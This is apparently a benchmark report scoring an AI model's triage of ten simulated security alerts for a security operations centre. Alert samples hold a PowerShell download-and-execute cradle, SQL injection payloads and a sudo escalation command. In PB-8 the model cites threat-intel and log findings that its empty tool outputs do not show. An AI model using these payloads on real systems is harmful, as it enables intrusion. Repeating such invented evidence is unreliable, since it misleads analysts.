# Playbook benchmark — `gemma4:latest`

Model: `gemma4:latest`  
Mode: **tool-calling**  
Run started: 2026-05-06 04:02:49  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **100%** |
| Verdict accuracy | 10/10 (100%) |
| Severity accuracy | 10/10 (100%) |
| MITRE accuracy | 10/10 (100%) |
| Tool-selection accuracy | 10/10 (100%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 1 |
| p50 latency | 14.4 s |
| p95 latency | 15.1 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | PASS | PASS | PASS | PASS | 7.7s |
| PB-2 | inci | PASS | PASS | PASS | PASS | 14.5s |
| PB-3 | inci | PASS | PASS | PASS | PASS | 15.2s |
| PB-4 | inci | PASS | PASS | PASS | PASS | 15.1s |
| PB-5 | inci | PASS | PASS | PASS | PASS | 14.4s |
| PB-6 | inci | PASS | PASS | PASS | PASS | 14.8s |
| PB-7 | beni | PASS | PASS | PASS | PASS | 10.7s |
| PB-8 | inci | PASS | PASS | PASS | PASS | 13.0s |
| PB-9 | inci | PASS | PASS | PASS | PASS | 12.9s |
| PB-10 | inci | PASS | PASS | PASS | PASS | 13.5s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 7.67s · GPU 78%/10610MB · CPU 26% · RAM 33793MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "10.0.4.22"}) -> {"query": "10.0.4.22", "found": true, "hostname": "alice-laptop", "criticality": "low", "owner": "alice", "business_unit": "marketing", "os": "macOS 14", "tags"
- siem.query_logs({"hours": 24, "query": "alice"}) -> {"query": "alice", "hours": 24, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The asset (alice-laptop) is low criticality, and the SIEM query found no corroborating events, indicating routine user activity with no signs of compromise or anomaly."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 14.49s · GPU 78%/10610MB · CPU 27% · RAM 33792MB

_Tool calls_:
```
- siem.query_logs({"hours": 4, "query": "dom_admin_01 RDP"}) -> {"query": "dom_admin_01 RDP", "hours": 4, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
- threat_intel.lookup_ip({"ip": "41.78.122.18"}) -> {"ip": "41.78.122.18", "verdict": "malicious", "score": 92, "geo": "NG", "tags": ["c2", "rdp-bruteforce"], "first_seen": "2026-04-22", "notes": "Recent C2 sight
- cmdb.get_asset({"host_or_ip": "DC01"}) -> {"query": "DC01", "found": true, "hostname": "dc01", "criticality": "critical", "owner": "infra-team", "business_unit": "platform", "os": "Windows Server 2022",
- cmdb.get_asset({"host_or_ip": "FINANCE-DB"}) -> {"query": "FINANCE-DB", "found": false, "notes": "Not in CMDB \u2014 likely external or unmanaged asset."}
- siem.query_logs({"hours": 4, "query": "dom_admin_01 RDP"}) -> {"query": "dom_admin_01 RDP", "hours": 4, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
- threat_intel.lookup_ip({"ip": "41.78.122.18"}) -> 
- cmdb.get_asset({"host_or_ip": "DC01"}) -> 
- cmdb.get_asset({"host_or_ip": "FINANCE-DB"}) -> 
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "critical",
  "mitre": [
    "T1078",
    "T1021"
  ],
  "tools_used": [
    "lookup_ip",
    "get_asset",
    "query_logs"
  ],
  "rationale": "The source IP 41.78.122.18 is flagged as malicious with C2 and RDP bruteforce tags; furthermore, the activity targeted DC01, which is a critical, tier-0 domain controller, indicating a confirmed, high-impact lateral movement attempt."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs']) not_found_calls=1

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 15.23s · GPU 79%/10610MB · CPU 23% · RAM 34486MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "89.248.165.74"}) -> {"ip": "89.248.165.74", "verdict": "malicious", "score": 88, "geo": "NL", "tags": ["botnet", "wp-bruteforce"], "first_seen": "2026-03-11", "notes": "Known WordP
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> {"query": "10.0.4.10", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "t
- siem.query_logs({"hours": 1, "query": "webhost /wp-login.php"}) -> {"query": "webhost /wp-login.php", "hours": 1, "matched": 50312, "events": [{"ts": "2026-05-06T14:01:02Z", "src_ip": "89.248.165.74", "method": "POST", "path": 
- threat_intel.lookup_ip({"ip": "89.248.165.74"}) -> 
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> 
- siem.query_logs({"hours": 1, "query": "webhost /wp-login.php"}) -> 
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003",
    "T1190"
  ],
  "tools_used": [
    "lookup_ip",
    "get_asset",
    "query_logs"
  ],
  "rationale": "The source IP 89.248.165.74 is flagged as malicious and associated with botnet activity. The target webhost (10.0.4.10) is a high-criticality, public-facing asset. SIEM logs confirm a massive credential-stuffing burst and three successful admin logins, indicating a successful breach attempt."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs'])

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 15.06s · GPU 79%/10610MB · CPU 38% · RAM 34076MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.220.101.15"}) -> {"ip": "185.220.101.15", "verdict": "malicious", "score": 95, "geo": "DE", "tags": ["tor-exit", "malware-c2"], "first_seen": "2025-11-29", "notes": "Tor exit no
- cmdb.get_asset({"host_or_ip": "WIN-DEV-04"}) -> {"query": "WIN-DEV-04", "found": true, "hostname": "WIN-DEV-04", "criticality": "medium", "owner": "dave", "business_unit": "engineering", "os": "Windows 11", "
- siem.query_logs({"hours": 1, "query": "WIN-DEV-04"}) -> {"query": "WIN-DEV-04", "hours": 1, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
- edr.get_processes({"host": "WIN-DEV-04"}) -> {"host": "WIN-DEV-04", "found": true, "processes": [{"pid": 4112, "name": "winword.exe", "parent": "explorer.exe", "cmdline": "WINWORD.EXE /n \"C:\\Users\\dave\
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1197",
    "T1059",
    "T1105"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs",
    "edr.get_processes"
  ],
  "rationale": "The external IP 185.220.101.15 is flagged as malicious with C2 tags (score 95). Furthermore, the EDR output confirms a highly suspicious process chain: winword.exe (Office app) spawned powershell.exe, which executed a remote download and execution command, indicating a successful spearphishing attack."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['edr.get_processes', 'threat_intel.lookup_ip'])

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 14.37s · GPU 75%/10610MB · CPU 18% · RAM 33995MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "10.0.4.55"}) -> {"query": "10.0.4.55", "found": true, "hostname": "ops-jumphost", "criticality": "high", "owner": "secops", "business_unit": "platform", "os": "Ubuntu 22.04", "
- threat_intel.lookup_domain({"domain": "cdn-update.xyz"}) -> {"domain": "cdn-update.xyz", "verdict": "malicious", "score": 90, "registered": "2026-04-22", "tags": ["dga-like", "dns-tunnel"], "notes": "Registered 14 days a
- siem.query_logs({"hours": 4, "query": "10.0.4.55 cdn-update.xyz"}) -> {"query": "10.0.4.55 cdn-update.xyz", "hours": 4, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "critical",
  "mitre": [
    "T1071.004",
    "T1567"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "lookup_domain",
    "siem.query_logs"
  ],
  "rationale": "The target domain cdn-update.xyz is flagged as malicious with 'dga-like' and 'dns-tunnel' tags (score 90). The source host, ops-jumphost, is high-criticality and tagged 'no-egress-allowed'; the massive, unique query volume to a malicious domain constitutes a severe violation of expected network behavior."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_domain', 'cmdb.get_asset'])

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 14.78s · GPU 76%/10610MB · CPU 23% · RAM 33963MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.220.101.45"}) -> {"ip": "185.220.101.45", "verdict": "malicious", "score": 95, "geo": "DE", "tags": ["tor-exit", "ssh-bruteforce"], "first_seen": "2025-12-04", "notes": "Tor exi
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> {"query": "10.0.4.10", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "t
- siem.query_logs({"hours": 6, "query": "10.0.4.10 OR 185.220.101.45"}) -> {"query": "10.0.4.10 OR 185.220.101.45", "hours": 6, "matched": 9, "events": [{"ts": "2026-05-06T03:41:02Z", "host": "webhost", "subject": "sshd", "msg": "Faile
- threat_intel.lookup_ip({"ip": "185.220.101.45"}) -> 
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> 
- siem.query_logs({"hours": 6, "query": "10.0.4.10 OR 185.220.101.45"}) -> 
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110",
    "T1078"
  ],
  "tools_used": [
    "lookup_ip",
    "get_asset",
    "query_logs"
  ],
  "rationale": "The source IP 185.220.101.45 is marked 'malicious' and associated with 'ssh-bruteforce'. The target webhost (10.0.4.10) is high criticality and public-facing. SIEM logs confirm the sequence of failed attempts followed by a successful login as 'ubuntu', indicating a successful compromise."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 10.73s · GPU 76%/10610MB · CPU 8% · RAM 33982MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> {"query": "10.0.4.10", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "t
- cmdb.get_asset({"host_or_ip": "10.0.4.22"}) -> {"query": "10.0.4.22", "found": true, "hostname": "alice-laptop", "criticality": "low", "owner": "alice", "business_unit": "marketing", "os": "macOS 14", "tags"
- siem.query_logs({"hours": 24, "query": "alice"}) -> {"query": "alice", "hours": 24, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The login occurred between two known, authorized assets (alice-laptop and webhost). The SIEM query found no other matching events for 'alice' in the last 24 hours, and the event is described as routine access."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 12.95s · GPU 78%/10610MB · CPU 21% · RAM 33977MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.62.190.13"}) -> 
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> 
- siem.query_logs({"hours": 1, "query": "185.62.190.13 OR webhost"}) -> 
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1190"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The source IP 185.62.190.13 was flagged as malicious and is directly responsible for the observed activity. The SIEM logs confirm a burst of multiple SQL injection attempts (T1190) targeting the public-facing web application."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 12.88s · GPU 77%/10612MB · CPU 24% · RAM 33940MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- siem.query_logs({"hours": 1, "query": "bob"}) -> {"query": "bob", "hours": 1, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1098",
    "T1548"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The action involves modifying service account permissions (adding svc_backup to sudo) on a high-criticality, public-facing asset (webhost). Although the SIEM found no related events, the nature of the privilege modification at an unusual time is highly suspicious."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 13.52s · GPU 79%/10612MB · CPU 17% · RAM 33968MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "DC01"}) -> {"query": "DC01", "found": true, "hostname": "dc01", "criticality": "critical", "owner": "infra-team", "business_unit": "platform", "os": "Windows Server 2022",
- cmdb.get_asset({"host_or_ip": "KIOSK-04"}) -> {"query": "KIOSK-04", "found": true, "hostname": "KIOSK-04", "criticality": "low", "owner": "facilities", "business_unit": "office", "os": "Windows 10", "tags":
- cmdb.get_asset({"host_or_ip": "192.168.50.13"}) -> {"query": "192.168.50.13", "found": true, "hostname": "KIOSK-04", "criticality": "low", "owner": "facilities", "business_unit": "office", "os": "Windows 10", "t
- siem.query_logs({"hours": 6, "query": "Administrator AND 192.168.50.13"}) -> {"query": "Administrator AND 192.168.50.13", "hours": 6, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003",
    "T1078"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The alert details a brute-force attack (5 failed logins) against DC01, which is a critical, tier-0 domain controller. The source machine, KIOSK-04, is tagged 'no-admin-auth-expected,' indicating a policy violation and suspicious source for administrative activity."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])
